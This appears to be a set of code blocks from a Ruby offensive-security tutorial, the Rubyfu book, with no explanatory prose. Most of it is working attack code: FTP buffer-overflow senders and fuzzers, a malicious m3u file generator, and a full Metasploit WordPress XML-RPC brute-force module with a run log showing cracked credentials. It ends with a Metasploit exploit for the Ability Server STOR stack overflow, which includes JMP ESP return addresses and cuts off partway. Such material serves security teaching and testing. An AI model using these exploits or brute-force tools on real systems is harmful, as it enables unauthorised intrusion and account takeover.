["```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'socket'\n\nbuffer = \"A\" * 2000\n\n#--> Networking\nhost = ARGV[0]\nport = ARGV[1] || 21\n\ns = TCPSocket.open(host, port)\ns.recv(1024)\nputs \"[+] Sending Username.\"\ns.send(\"USER ftp\\r\\n\", 0)\ns.recv(1024)\nputs \"[+] Sending Password.\"\ns.send(\"PASS ftp\\r\\n\", 0)\ns.recv(1024)\nputs \"[+] Sending Evil buffer...\"\ns.send(\"APPE \" + buffer + \"\\r\\n\", 0)\ntotal = s.send(\"STOR \" + buffer + \"\\r\\n\", 0)\n#--> Exploit Info\nputs \"[+] \" + \"Total exploit size: \" + \"#{total} bytes.\"\nputs \"[+] \" + \" Buffer length: \" + \"#{buffer.size} bytes.\"\nputs \"[+] Done\"\n\ns.close \n```", "```\nruby ftp_exploit.rb [TARGET] [PORT] \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n\nfile = ARGV[0] || \"exploit.m3u\"\n\njunk  = \"A\" * 2000\neip   = \"B\" * 4\nnops  = \"\\x90\" * 8\nshell = \"S\" * 368\nexploit = junk + eip + nops + shell\n\nFile.open(file, 'w') {|f| f.write(exploit)}\nputs \"[*] Exploit size: #{exploit.size}\" \n```", "```\nruby m3u_exploit.rb song1.m3u \n```", "```\n#!/bin/ruby\n# KING SABRI | @KINGSABRI\n# Simple FTP COMMNDS Fuzzer\n#\nrequire 'socket'\n\nclass String\n  def red; colorize(self, \"\\e[31m\"); end\n  def green; colorize(self, \"\\e[32m\"); end\n  def colorize(text, color_code);  \"#{color_code}#{text}\\e[0m\" end\nend\n\nmark_Red   = \"[+]\".red\nmark_Green = \"[+]\".green\n\nhost = ARGV[0] || \"127.0.0.1\"\nport = ARGV[1] || 21\n\n# List of FTP protocol commands\ncmds = [\"MKD\",\"ACCL\",\"TOP\",\"CWD\",\"STOR\",\"STAT\",\"LIST\",\"RETR\",\"NLST\",\"LS\",\"DELE\",\"RSET\",\"NOOP\",\"UIDL\",\"USER\",\"APPE\"]\n\nbuffer  = [\"A\"]\ncounter = 1\n\ncmds.each do |cmd|\n  buffer.each do |buf|\n\n    while buffer.length <= 40\n      buffer << \"A\" * counter\n      counter += 100\n    end\n\n    s = TCPSocket.open(host, port)\n    s.recv(1024)\n    s.send(\"USER ftp\\r\\n\", 0)\n    s.recv(1024)\n    s.send(\"PASS ftp\\r\\n\", 0)\n    s.recv(1024)\n    puts mark_Red + \" Sending \" + \"#{cmd} \".green + \"Command with \" + \"#{buf.size} bytes \".green  + \"Evil buffer\" + \".\".green\n    s.send(cmd + \" \" + buf + \"\\r\\n\", 0)\n    s.recv(1024)\n    s.send(\"QUIT\\r\\n\", 0)\n    s.close\n  end\n  puts \"~~~~~~~~~~~~~~~~~~~~\".red\n  sleep 0.5\nend \n```", "```\n#!/usr/bin/evn ruby\n#\n# KING SABRI | @KINGSABRI\n# Simple FTP COMMNDS Fuzzer\n#\nrequire 'socket'\n\nif ARGV.size < 1 \n  puts \"#{__FILE__} <host> [port]\"\n  exit 0 \nelse\n  @host = ARGV[0]\n  @port = ARGV[1] || 21\nend\n\ndef fuzz(payload)\n  begin \n  s = TCPSocket.open(@host, @port)\n  s.recv(2048)\n  s.send payload, 0\n  s.recv(2048)\n  s.close\n  rescue\n    puts \"Crash detected after #{payload.size} bytes\"\n    exit 0\n  end\nend\n\ndef insertion(point=\"\", buffer=0)\n  buffer = buffer * 10\n  points = \n    {\n      core:           \"A\" * buffer, # Comment this line is it hangs the fuzzer\n      user: \"USER \" + \"B\" * buffer + \"\\r\\n\",\n      pass: \"PASS \" + \"C\" * buffer + \"\\r\\n\",\n      accl: \"ACCL \" + \"D\" * buffer + \"\\r\\n\",\n      appe: \"APPE \" + \"E\" * buffer + \"\\r\\n\",\n      cmd:  \"CWD \"  + \"F\" * buffer + \"\\r\\n\",\n      dele: \"DELE \" + \"G\" * buffer + \"\\r\\n\",\n      list: \"LIST \" + \"H\" * buffer + \"\\r\\n\",\n      ls:   \"LS \"   + \"I\" * buffer + \"\\r\\n\",\n      mkd:  \"MKD \"  + \"J\" * buffer + \"\\r\\n\",\n      nlst: \"NLST \" + \"K\" * buffer + \"\\r\\n\",\n      noop: \"NOOP \" + \"L\" * buffer + \"\\r\\n\",\n      retr: \"RETR \" + \"M\" * buffer + \"\\r\\n\",\n      rest: \"RSET \" + \"N\" * buffer + \"\\r\\n\",\n      stat: \"STAT \" + \"O\" * buffer + \"\\r\\n\",\n      stor: \"STOR \" + \"P\" * buffer + \"\\r\\n\",\n      top:  \"TOP \"  + \"Q\" * buffer + \"\\r\\n\",\n      uidl: \"UIDL \" + \"R\" * buffer + \"\\r\\n\"\n      }\n  return points[point] unless point.empty?\n  points\nend\n\nputs \"[+] Fuzzing #{@host} on port #{@port}...\"\ninsertion.keys.each do |point|\n  (1..500).each do |buffer|\n\n    puts \"[+] Fuzzing #{point.to_s}: #{insertion(point, buffer).size} bytes\"\n    fuzz insertion(point, buffer)\n\n  end\nend \n```", "```\nint WINAPI MessageBox( _In_opt_ HWND    hWnd,\n  _In_opt_ LPCTSTR lpText,\n  _In_opt_ LPCTSTR lpCaption,\n  _In_     UINT    uType ); \n```", "```\nrequire \"Win32API\"\n\ntitle = \"Rubyfu!\"\nmessage = \"You've called the Windows API Successfully! \\n\\n@Runyfu\"\n\napi = Win32API.new('user32', 'MessageBoxA',['L', 'P', 'P', 'L'],'I')\napi.call(0,message,title,0) \n```", "```\n# Load importer part of fiddle (ffi) library\nrequire 'fiddle/import'\n\n# int WINAPI MessageBox(\n#   _In_opt_ HWND    hWnd,\n#   _In_opt_ LPCTSTR lpText,\n#   _In_opt_ LPCTSTR lpCaption,\n#   _In_     UINT    uType\n# );\n# Create module as body for an importer instance\nmodule User32\n    # Extend this module to an importer\n    extend Fiddle::Importer\n    # Load 'user32' dynamic library into this importer\n    dlload 'user32'\n    # Set C aliases to this importer for further understanding of function signatures\n    typealias 'HWND', 'HANDLE'\n    typealias 'LPCSTR', 'const char*'\n    typealias 'LPCWSTR', 'const wchar_t*'\n    typealias 'UINT', 'unsigned int'\n    typealias 'HANDLE', 'void*'\n    # Import C functions from loaded libraries and set them as module functions\n    extern 'int MessageBoxA(HWND, LPCSTR, LPCSTR, UINT)'\nend\n\ntitle = \"Rubyfu!\"\nmessage = \"You've called the Windows API Successfully! \\n\\n@Runyfu\"\nUser32::MessageBoxA(nil, message, title, 0) \n```", "```\nrequire 'fiddle/import'\n#\n# KING SABRI | @KINGSABRI\n#\nif ARGV.size == 2\n  lpfilename  = ARGV[0] # Library Name\n  lpprocname  = ARGV[1] # Function Name\nelse\n  puts \"ruby arwin.rb <Library Name> <Function Name>\"\n  puts \"example:\\n arwin.rb user32.dll MessageBoxA\"\n  exit 0\nend\n\nmodule Kernel32\n\n  # Extend this module to an importer\n  extend Fiddle::Importer\n  # Load 'user32' dynamic library into this importer\n  dlload 'kernel32'\n\n  # HMODULE WINAPI LoadLibrary(\n  #   _In_ LPCTSTR lpFileName\n  # );\n  typealias 'lpfilename', 'char*'\n  extern 'unsigned char* LoadLibrary(lpfilename)'\n\n  # FARPROC WINAPI GetProcAddress(\n  #   _In_ HMODULE hModule,\n  #   _In_ LPCSTR  lpProcName\n  # );\n  typealias 'lpfilename', 'char*'\n  typealias 'lpprocname', 'char*'\n  extern 'unsigned char* GetProcAddress(lpfilename, lpprocname)'\n\nend\naddress = Kernel32::GetProcAddress(Kernel32::LoadLibrary(lpfilename), lpprocname).inspect.scan(/0x[\\h]+/i)[1]\nunless address.hex.zero?\n  puts \"\\n[+] #{lpprocname} is location at #{address} in #{lpfilename}\\n\"\nelse\n  puts \"[!] Could find #{lpprocname} in #{lpfilename}!\"\n  puts \"[-] Function's name is case sensitive\"\nend \n```", "```\n[+] MessageBoxA is location at 0x77d8050b in user32.dll \n```", "```\n# Complex Parts | Computer framework \nclass CPU \n  def freeze; end\n  def jump(position); end\n  def execute; end\nend\n\nclass Memory\n  def load(position, data); end\nend\n\nclass HardDrive\n  def read(lba, size); end\nend\n\n# Facade | Interface\nclass ComputerFacade\n\n  def initialize\n    @processor = CPU.new\n    @ram = Memory.new\n    @hd  = HardDrive.new\n  end\n\n  def start\n    @processor.freeze\n    @ram.load(BOOT_ADDRESS, @hd.read(BOOT_SECTOR, SECTOR_SIZE))\n    @processor.jump(BOOT_ADDRESS)\n    @processor.execute\n  end\nend\n\n# Client (The Developer want to use the complex computer framework)\ncomputer_facade = ComputerFacade.new\ncomputer_facade.start \n```", "```\nrequire 'net/http'\nrequire 'uri'\n\nurl = URI.parse('http://rubyfu.net')\n\nres = Net::HTTP.start(url.host, url.port) {|http|\n  http.get('/content/index.html')\n}\n\nputs res.body \n```", "```\nrequire \"open-uri\"\n\nputs open(\"http://rubyfu.net/content/index.html\").read \n```", "```\n mkdir -p $HOME/.msf4/modules/{auxiliary,exploits,post} \n```", "```\n##\n# This module requires Metasploit: http://www.metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\n### Module Type ###\nclass Metasploit3 < Msf::Exploit::Remote\n####################\n\n### Module Requirements ###\ninclude Exploit::Remote::Tcp\n####################\n\n### Exploit Rank ####\n  Rank = ExcellentRanking\n####################\n\n### Module Information\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Absolute MSF template',\n      'Description'     => %q{This is an absolute MSF template that shows how all modules look like},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Rubyfu (@Rubyfu)',\n          'Sabri (@KINGSABRI)'\n        ],\n      'References'      =>\n        [\n          ['URL', 'http://Rubyfu.net'],\n          ['URL', 'https://github.com/Rubyfu']\n        ],\n      'Platform'        => %w{ linux win osx solaris unix bsd android aix},\n      'Targets'         =>\n        [\n            ['Universal', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate'  => '2015'\n    ))\n\n    # Module Options | show options\n    register_options(\n      [\n          Opt::RPORT(22),\n          OptString.new('USER', [ true, 'Valid username', 'admin' ]),\n          OptString.new('PASS', [ true, 'Valid password for username', 'P@ssw0rd' ]),\n      ], self.class)\n\n    # Module Advanced Options | show advanced\n    register_advanced_options(\n      [\n          OptInt.new('THREADS', [true, 'The number of concurrent threads', 5])\n      ], self.class)\n  end\n####################\n\n### Module Operations ###\n  def exploit # or 'run' for post and auxiliary modules\n    print_status('Starting Rubyfu')\n    print_warning(\"It's just a template.\")\n    print_good('Ruby goes evil!')\n    print_error(\"Thank you!\")\n  end\n####################\n\nend \n```", "```\n    ~/msf4/modules \n    ```", "```\n    metasploit-framework/modules/ \n    ```", "```\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>system.multicall</methodName>\n<params>\n <param><value><array><data>\n\n  <value><struct>\n  <member>\n    <name>methodName</name>\n    <value><string>wp.getUsersBlogs</string></value>\n  </member>\n  <member>\n    <name>params</name><value><array><data>\n     <value><array><data>\n      <value><string>\"USER #1\"</string></value>\n      <value><string>\"PASS #1\"</string></value>\n     </data></array></value>\n    </data></array></value>\n  </member>\n\n  ...Snippet...\n\n  <value><struct>\n  <member>\n    <name>methodName</name>\n    <value><string>wp.getUsersBlogs</string></value>\n  </member>\n  <member>\n    <name>params</name><value><array><data>\n     <value><array><data>\n      <value><string>\"USER #1\"</string></value>\n      <value><string>\"PASS #N\"</string></value>\n     </data></array></value>\n    </data></array></value>\n  </member>\n\n</params>\n</methodCall> \n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n        <array>\n          <data>\n            <value>\n              <struct>\n                <member>\n                  <name>faultCode</name>\n                  <value>\n                    <int>403</int>\n                  </value>\n                </member>\n                <member>\n                  <name>faultString</name>\n                  <value>\n                    <string>Incorrect username or password.</string>\n                  </value>\n                </member>\n              </struct>\n            </value>\n          </data>\n        </array>\n      </value>\n    </param>\n  </params>\n</methodResponse> \n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n        <array>\n          <data>\n            <value>\n              <array>\n                <data>\n                  <value>\n                    <array>\n                      <data>\n                        <value>\n                          <struct>\n                            <member>\n                              <name>isAdmin</name>\n                              <value>\n                                <boolean>1</boolean>\n                              </value>\n                            </member>\n                            <member>\n                              <name>url</name>\n                              <value>\n                                <string>http://172.17.0.3/</string>\n                              </value>\n                            </member>\n                            <member>\n                              <name>blogid</name>\n                              <value>\n                                <string>1</string>\n                              </value>\n                            </member>\n                            <member>\n                              <name>blogName</name>\n                              <value>\n                                <string>Docker wordpress</string>\n                              </value>\n                            </member>\n                            <member>\n                              <name>xmlrpc</name>\n                              <value>\n                                <string>http://172.17.0.3/xmlrpc.php</string>\n                              </value>\n                            </member>\n                          </struct>\n                        </value>\n                      </data>\n                    </array>\n                  </value>\n                </data>\n              </array>\n            </value>\n          </data>\n        </array>\n      </value>\n    </param>\n  </params>\n</methodResponse> \n```", "```\n##\n# This module requires Metasploit: http://www.metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n            info,\n            'Name'         => 'WordPress XML-RPC Massive Brute Force',\n            'Description'  => %q{WordPress massive brute force attacks via WordPress XML-RPC service.},\n            'License'      => MSF_LICENSE,\n            'Author'       =>\n                [\n                  'Sabri (@KINGSABRI)',           # Module Writer\n                  'William (WCoppola@Lares.com)'  # Module Requester\n                ],\n            'References'   =>\n                [\n                  ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],\n                  ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']\n                ]\n          ))\n\n    register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path', '/']),\n          OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',\n                                      File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n          OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',\n                                      File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\")]),\n          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6]),\n          OptInt.new('CHUNKSIZE', [true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500])\n        ], self.class)\n  end\nend \n```", "```\n def usernames\n    File.readlines(datastore['WPUSER_FILE']).map {|user| user.chomp}\n  end\n\n  def passwords\n    File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}\n  end \n```", "```\n #\n  # XML Factory\n  #\n  def generate_xml(user)\n\n    vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500\n    xml_payloads = []                          # Container for all generated XMLs\n    # Evil XML | Limit number of log-ins to CHUNKSIZE/request due WordPress limitation which is 1700 maximum.\n    passwords.each_slice(datastore['CHUNKSIZE']) do |pass_group|\n\n      document = Nokogiri::XML::Builder.new do |xml|\n        xml.methodCall {\n          xml.methodName(\"system.multicall\")\n          xml.params {\n          xml.param {\n          xml.value {\n          xml.array {\n          xml.data {\n\n        pass_group.each  do |pass|\n          xml.value {\n          xml.struct {\n          xml.member {\n          xml.name(\"methodName\")\n          xml.value { xml.string(\"wp.getUsersBlogs\") }}\n            xml.member {\n            xml.name(\"params\")\n            xml.value {\n            xml.array {\n            xml.data {\n            xml.value {\n            xml.array {\n              xml.data {\n                xml.value { xml.string(user) }\n                xml.value { xml.string(pass) }\n          }}}}}}}}}\n        end\n\n          }}}}}}\n      end\n\n      xml_payloads << document.to_xml\n    end\n\n    vprint_status('Generating XMLs just done.')\n    xml_payloads\n  end \n```", "```\n #\n  # Check target status\n  #\n  def check_wpstatus\n    print_status(\"Checking #{peer} status!\")\n\n    if !wordpress_and_online?\n      print_error(\"#{peer}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked! (Do Manual Check)\")\n      nil\n    elsif !wordpress_xmlrpc_enabled?\n      print_error(\"#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XML-RPC\")\n      nil\n    else\n      print_status(\"Target #{peer} is running WordPress\")\n      true\n    end\n\n  end \n```", "```\n #\n  # Connection Setup\n  #\n  def send(xml)\n    uri  = target_uri.path\n    opts =\n      {\n        'method'  => 'POST',\n        'uri'     => normalize_uri(uri, wordpress_url_xmlrpc),\n        'data'    => xml,\n        'ctype'   =>'text/xml'\n      }\n    client = Rex::Proto::Http::Client.new(rhost)\n    client.connect\n    req  = client.request_cgi(opts)\n    res  = client.send_recv(req)\n\n    if res && res.code != 200\n      print_error('It seems you got blocked!')\n      print_warning(\"I'll sleep for #{datastore['BLOCKEDWAIT']} minutes, then I'll try again. CTR+C to exit\")\n      sleep datastore['BLOCKEDWAIT'] * 60\n    end\n    @res = res\n  end \n```", "```\n def run\n    return if check_wpstatus.nil?\n\n    usernames.each do |user|\n      passfound = false\n\n      print_status(\"Brute forcing user: #{user}\")\n      generate_xml(user).each do |xml|\n        next if passfound == true\n\n        send(xml)\n\n        # Request Parser\n        req_xml = Nokogiri::Slop xml\n        # Response Parser\n        res_xml = Nokogiri::Slop @res.to_s.scan(/<.*>/).join\n        puts res_xml\n        res_xml.search(\"methodResponse/params/param/value/array/data/value\").each_with_index do |value, i|\n\n          result =  value.at(\"struct/member/value/int\")\n          # If response error code doesn't not exist, then it's the correct credentials!\n          if result.nil?\n            user = req_xml.search(\"data/value/array/data\")[i].value[0].text.strip\n            pass = req_xml.search(\"data/value/array/data\")[i].value[1].text.strip\n            print_good(\"Credentials Found! #{user}:#{pass}\")\n\n            passfound = true\n          end\n\n        end\n\n        unless user == usernames.last\n          vprint_status('Sleeping for 2 seconds..')\n          sleep 2\n        end\n\n      end \n    end \n  end \n```", "```\n##\n# This module requires Metasploit: http://www.metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n            info,\n            'Name'         => 'WordPress XML-RPC Massive Brute Force',\n            'Description'  => %q{WordPress massive brute force attacks via WordPress XML-RPC service.},\n            'License'      => MSF_LICENSE,\n            'Author'       =>\n                [\n                  'Sabri (@KINGSABRI)',           # Module Writer\n                  'William (WCoppola@Lares.com)'  # Module Requester\n                ],\n            'References'   =>\n                [\n                  ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],\n                  ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']\n                ]\n          ))\n\n    register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path', '/']),\n          OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',\n                                      File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n          OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',\n                                      File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\")]),\n          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6]),\n          OptInt.new('CHUNKSIZE', [true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500])\n        ], self.class)\n  end\n\n  def usernames\n    File.readlines(datastore['WPUSER_FILE']).map {|user| user.chomp}\n  end\n\n  def passwords\n    File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}\n  end\n\n  #\n  # XML Factory\n  #\n  def generate_xml(user)\n\n    vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500\n    xml_payloads = []                          # Container for all generated XMLs\n    # Evil XML | Limit number of log-ins to CHUNKSIZE/request due WordPress limitation which is 1700 maximum.\n    passwords.each_slice(datastore['CHUNKSIZE']) do |pass_group|\n\n      document = Nokogiri::XML::Builder.new do |xml|\n        xml.methodCall {\n          xml.methodName(\"system.multicall\")\n          xml.params {\n          xml.param {\n          xml.value {\n          xml.array {\n          xml.data {\n\n        pass_group.each  do |pass|\n          xml.value {\n          xml.struct {\n          xml.member {\n          xml.name(\"methodName\")\n          xml.value { xml.string(\"wp.getUsersBlogs\") }}\n            xml.member {\n            xml.name(\"params\")\n            xml.value {\n            xml.array {\n            xml.data {\n            xml.value {\n            xml.array {\n              xml.data {\n                xml.value { xml.string(user) }\n                xml.value { xml.string(pass) }\n          }}}}}}}}}\n        end\n\n          }}}}}}\n      end\n\n      xml_payloads << document.to_xml\n    end\n\n    vprint_status('Generating XMLs just done.')\n    xml_payloads\n  end\n\n  #\n  # Check target status\n  #\n  def check_wpstatus\n    print_status(\"Checking #{peer} status!\")\n\n    if !wordpress_and_online?\n      print_error(\"#{peer}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked! (Do Manual Check)\")\n      nil\n    elsif !wordpress_xmlrpc_enabled?\n      print_error(\"#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XML-RPC\")\n      nil\n    else\n      print_status(\"Target #{peer} is running WordPress\")\n      true\n    end\n\n  end\n\n  #\n  # Connection Setup\n  #\n  def send(xml)\n    uri  = target_uri.path\n    opts =\n      {\n        'method'  => 'POST',\n        'uri'     => normalize_uri(uri, wordpress_url_xmlrpc),\n        'data'    => xml,\n        'ctype'   =>'text/xml'\n      }\n    client = Rex::Proto::Http::Client.new(rhost)\n    client.connect\n    req  = client.request_cgi(opts)\n    res  = client.send_recv(req)\n\n    if res && res.code != 200\n      print_error('It seems you got blocked!')\n      print_warning(\"I'll sleep for #{datastore['BLOCKEDWAIT']} minutes, then I'll try again. CTR+C to exit\")\n      sleep datastore['BLOCKEDWAIT'] * 60\n    end\n    @res = res\n  end\n\n  def run\n    return if check_wpstatus.nil?\n\n    usernames.each do |user|\n      passfound = false\n\n      print_status(\"Brute forcing user: #{user}\")\n      generate_xml(user).each do |xml|\n        next if passfound == true\n\n        send(xml)\n\n        # Request Parser\n        req_xml = Nokogiri::Slop xml\n        # Response Parser\n        res_xml = Nokogiri::Slop @res.to_s.scan(/<.*>/).join\n        puts res_xml \n        res_xml.search(\"methodResponse/params/param/value/array/data/value\").each_with_index do |value, i|\n\n          result =  value.at(\"struct/member/value/int\")\n          # If response error code doesn't not exist\n          if result.nil?\n            user = req_xml.search(\"data/value/array/data\")[i].value[0].text.strip\n            pass = req_xml.search(\"data/value/array/data\")[i].value[1].text.strip\n            print_good(\"Credentials Found! #{user}:#{pass}\")\n\n            passfound = true\n          end\n\n        end\n\n        unless user == usernames.last\n          vprint_status('Sleeping for 2 seconds..')\n          sleep 2\n        end\n\n  end end end\nend \n```", "```\nmetasploit-framework/tools/dev/msftidy.rb wordpress_xmlrpc_massive_bruteforce.rb \n```", "```\nmsf auxiliary(wordpress_xmlrpc_massive_bruteforce) > show options \n\nModule options (auxiliary/scanner/http/wordpress_xmlrpc_massive_bruteforce):\n\n   Name         Current Setting                                                                 Required  Description\n   ----         ---------------                                                                 --------  -----------\n   BLOCKEDWAIT  6                                                                               yes       Time(minutes) to wait if got blocked\n   CHUNKSIZE    1500                                                                            yes       Number of passwords need to be sent per request. (1700 is the max)\n   Proxies                                                                                      no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST        172.17.0.3                                                                      yes       The target address\n   RPORT        80                                                                              yes       The target port\n   TARGETURI    /                                                                               yes       The base path\n   VHOST                                                                                        no        HTTP server virtual host\n   WPPASS_FILE  /home/KING/Code/MSF/metasploit-framework/data/wordlists/http_default_pass.txt   yes       File containing passwords, one per line\n   WPUSER_FILE  /home/KING/Code/MSF/metasploit-framework/data/wordlists/http_default_users.txt  yes       File containing usernames, one per line\n\nmsf auxiliary(wordpress_xmlrpc_massive_bruteforce) > run\n\n[*] Checking 172.17.0.3:80 status!\n[*] Target 172.17.0.3:80 is running WordPress\n[*] Brute forcing user: admin\n[+] Credentials Found! admin:password\n[*] Brute forcing user: manager\n[*] Brute forcing user: root\n[*] Brute forcing user: cisco\n[*] Brute forcing user: apc\n[*] Brute forcing user: pass\n[*] Brute forcing user: security\n[*] Brute forcing user: user\n[*] Brute forcing user: system\n[+] Credentials Found! system:root\n[*] Brute forcing user: sys\n[*] Brute forcing user: wampp\n[*] Brute forcing user: newuser\n[*] Brute forcing user: xampp-dav-unsecure\n[*] Auxiliary module execution completed \n```", "```\n##\n# This module requires Metasploit: http://www.metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\n### Module Type ###\nclass Metasploit3 < Msf::Exploit::Remote\nRank = NormalRanking\n\ninclude Msf::Exploit::Remote::Ftp \n```", "```\n def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Ability Server 2.34 STOR Command Stack Buffer Overflow',\n      'Description'     => %q{\n        This module exploits a stack-based buffer overflow in Ability Server 2.34.\n        Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,\n        which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.\n\n        The vulnerability has been confirmed on version 2.34 and has also been reported\n        in version 2.25 and 2.32\\. Other versions may also be affected.},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'muts',            # Initial discovery\n          'Dark Eagle',      # same as muts\n          'Peter Osterberg', # Metasploit\n          'Ruby (@Rubyfu)',  # Just explain the module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2004-1626' ],\n          [ 'OSVDB', '11030'],\n          [ 'EDB', '588'],\n          ['URL', 'http://rubyfu.net'] # Just explain the module\n        ],\n      'Platform'        => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2 ENG',\n            {\n              #JMP ESP  (MFC42.dll. Addr remains unchanged until a patched SP3)\n              'Ret' => 0x73E32ECF,\n              'Offset' => 966\n            }\n          ],\n          [\n            'Windows XP SP3 ENG',\n            {\n              #JMP ESP  (USER32.dll. Unchanged unpatched SP3 - fully patched)\n              'Ret' => 0x7E429353,\n              'Offset' => 966\n            }\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate' => 'Oct 22 2004'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftp' ]),\n        OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftp' ])\n      ], self.class)\n  end \n```", "```\ndef check\n  connect\n  disconnect\n  if banner =~ /Ability Server 2\\.34/\n    return Exploit::CheckCode::Appears\n  else\n    if banner =~ /Ability Server/\n      return Exploit::CheckCode::Detected\n    end\n  end\n  return Exploit::CheckCode::Safe\nend \n```", "```\ndef exploit\n  c = connect_login\n  return if not c\n\n  myhost = datastore['LHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['LHOST']\n\n  # Take client IP address + FTP user lengths into account for EIP offset\n  padd_size = target['Offset'] + (13 - myhost.length) + (3 - datastore['FTPUSER'].length)\n  junk = rand_text_alpha(padd_size)\n\n  sploit = junk\n  sploit << [target.ret].pack('V')\n  sploit << make_nops(32)\n  sploit << payload.encoded\n  sploit << rand_text_alpha(sploit.length)\n\n  send_cmd(['STOR', sploit], false)\n  handler\n  disconnect\nend \n```", "```\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Ability Server 2.34 STOR Command Stack Buffer Overflow',\n      'Description'     => %q{\n        This module exploits a stack-based buffer overflow in Ability Server 2.34.\n        Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,\n        which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.\n\n        The vulnerability has been confirmed on version 2.34 and has also been reported\n        in version 2.25 and 2.32\\. Other versions may also be affected.},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'muts',            # Initial discovery\n          'Dark Eagle',      # same as muts\n          'Peter Osterberg', # Metasploit\n          'Ruby (@Rubyfu)',  # Just explain the module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2004-1626' ],\n          [ 'OSVDB', '11030'],\n          [ 'EDB', '588'],\n          ['URL', 'http://rubyfu.net'] # Just explain the module\n        ],\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2 ENG',\n            {\n              #JMP ESP  (MFC42.dll. Addr remains unchanged until a patched SP3)\n              'Ret' => 0x73E32ECF,\n              'Offset' => 966\n            }\n          ],\n          [\n            'Windows XP SP3 ENG',\n            {\n              #JMP ESP  (USER32.dll. Unchanged unpatched SP3 - fully patched)\n              'Ret' => 0x7E429353,\n              'Offset' => 966\n            }\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate' => 'Oct 22 2004'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftp' ]),\n        OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftp' ])\n      ], self.class)\n  end\n\n  def check\n    connect\n    disconnect\n    if banner =~ /Ability Server 2\\.34/\n      return Exploit::CheckCode::Appears\n    else\n      if banner =~ /Ability Server/\n        return Exploit::CheckCode::Detected\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect_login\n    return if not c\n\n    myhost = datastore['LHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['LHOST']\n\n    # Take client 